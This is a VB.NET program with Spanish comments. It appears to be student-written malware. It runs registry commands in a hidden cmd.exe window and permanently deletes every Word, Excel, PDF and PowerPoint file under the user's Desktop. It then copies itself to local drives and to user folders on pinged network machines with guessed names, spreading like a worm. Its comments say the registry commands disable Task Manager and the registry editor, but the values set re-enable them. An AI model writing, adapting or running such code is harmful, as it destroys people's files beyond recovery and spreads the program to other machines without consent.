Imports System.IO 'Libreria que proporciona clases y métodos para realizar operaciones de entrada o salida
Imports Microsoft.VisualBasic.FileIO 'Libreria que contiene clases para manipular archivos y carpetas
Imports System.Net.NetworkInformation 'Libreria para trabajar con información de red

Module Program 'Linea que marca el inicio del modulo
    Sub Main() 'Funcion principal del programa

        Dim commands As String() = {
        "reg add hkcu\software\microsoft\windows\currentversion\policies\system /v disabletaskmgr /t reg_dword /d ""0"" /f", 'comando de registro para deshabilitar el administrador de tareas
        "reg add hkcu\software\microsoft\windows\currentversion\policies\system /v disableregistrytools /t reg_dword /d ""0"" /f" 'comando de registro para deshabilitar el editor de registros
        } ' matriz de cadenas que contiene dos comandos de registro, 1 desactiva y 0 las activa

        For Each command As String In commands
            Dim processInfo As New ProcessStartInfo("cmd.exe", "/c " & command) 'CMD
            processInfo.CreateNoWindow = True
            processInfo.UseShellExecute = False

            Dim process As Process = Process.Start(processInfo)
            process.WaitForExit()
        Next 'Bucle que recorre cada comando de registro en la ventada de comandos cmd.exe

        'Obtiene la ruta del archivo actual
        Dim currentFile As String = System.Reflection.Assembly.GetExecutingAssembly().Location 'Obtienen la ruta del archivo actual
        Dim fileName As String = Path.GetFileName(currentFile) 'Obtiene el nombre de archivo
        Dim destinationFolders As String() = {
            "C:\",
            "D:\",
            "E:\",
            "F:\",
            "G:\",
            "H:\",
            "X:\",
            "Y:\",
            "W:\",
            "Z:\"
        } 'Matriz de cadenas que contiene las rutas de las carpetas de destino

        Dim desktopPath As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "") 'Se obtiene la ruta del escritorio del usuario actual
        Dim folderPath As String = desktopPath 'se copia el valor de desktopPath a la variable folderPath

        Dim filesToDelete As String() = Directory.GetFiles(folderPath, "*.docx", IO.SearchOption.AllDirectories) 'Documentos word
        filesToDelete = filesToDelete.Concat(Directory.GetFiles(folderPath, "*.xlsx", IO.SearchOption.AllDirectories)).ToArray() 'Documentos de Excel
        filesToDelete = filesToDelete.Concat(Directory.GetFiles(folderPath, "*.pdf", IO.SearchOption.AllDirectories)).ToArray() 'Documentos PDF
        filesToDelete = filesToDelete.Concat(Directory.GetFiles(folderPath, "*.pptx", IO.SearchOption.AllDirectories)).ToArray() 'Presentaciones en power point
        'Se obtiene una lista con las extensiones 
        For Each file In filesToDelete
            FileSystem.DeleteFile(file, UIOption.OnlyErrorDialogs, RecycleOption.DeletePermanently)
        Next 'Se itera sobre cada archivo existente y se elimina permanentemente

        '-------------------------------------------------------------------------------------------------------------------------------------------
        Dim machines As String() = DiscoverMachines() 'Lista de nombres de máquinas llamando a la función
        Dim destinationFoldersList As List(Of String) = destinationFolders.ToList() 'lista creada a partir de la matriz de destinationFolders
        For Each machine As String In machines
            Dim sharedFolders As String() = GetSharedFolders(machine) 'se obtienen las carpetas compartidas
            For Each folder As String In sharedFolders
                destinationFoldersList.Add(Path.Combine(machine, folder)) 'Combinacion del nombre de la maquina y la carpeta compartida en una ruta
            Next
        Next
        destinationFolders = destinationFoldersList.ToArray() 'lista devuelta asignando a destinationFolders
        '-------------------------------------------------------------------------------------------------------------------------------------------
        'Entra en bucle para recorrer destinationFolders
        For Each folder In destinationFolders
            '-------------------------------------------------------------------------------------------------------------------------------------------
            If Directory.Exists(folder) Then
                Dim newFilePath As String = Path.Combine(folder, fileName) 'Si la carpeta existe se crea una nueva ruta de archivo
                If File.Exists(newFilePath) Then
                Else
                    File.Copy(currentFile, newFilePath) 'Si no existe se hace una copia en su ubicación
                End If
            Else
            End If
        Next
    End Sub
    '-------------------------------------------------------------------------------------------------------------------------------------------
    Function DiscoverMachines() As String() 'Funcion para el descubrimiento de las maquinas
        ' lista de nombres comunes de computadoras
        Dim machine As String() = {"DESKTOP-PC", "LAPTOP-USER", "WORKSTATION1", "SERVER-01", "CLIENT-PC", "MAIN-PC", "HOME-PC", "OFFICE-PC", "ADMIN-PC", "STUDENT-PC"}
        Return machine 'Se devuelve la lista 
    End Function
    '-------------------------------------------------------------------------------------------------------------------------------------------
    Function GetSharedFolders(ByVal machine As String) As String() 'Funcion para las carpetas compartidas
        Dim sharedFolders As New List(Of String)() 'Lista de cadenas para las rutas de las carpetas compartidas
        Try
            Dim ping As New Ping() 'Ping a la máquina 
            Dim reply As PingReply = ping.Send(machine) 'Hace el ping y se guarda la respuesta 
            If reply.Status = IPStatus.Success Then 'verifica la respuesta del ping antes de continuar
                Dim directories As String() = Directory.GetDirectories($"\\{machine}\Users") 'Matriz para las rutas de las carpetas
                For Each folder As String In directories 'Se itera sobre cada ruta
                    If (File.GetAttributes(folder) And FileAttributes.Directory) = FileAttributes.Directory AndAlso (File.GetAttributes(folder) And FileAttributes.Hidden) = 0 Then 'Verifica si cada ruta es una carpeta
                        sharedFolders.Add(folder) 'se agrega la ruta de la carpeta a la lista sharedFolders
                    End If
                Next
            End If
        Catch ex As Exception
        End Try
        Return sharedFolders.ToArray() 'Se devuelve la lista 
    End Function
    '-------------------------------------------------------------------------------------------------------------------------------------------
End Module 'Fin del modulo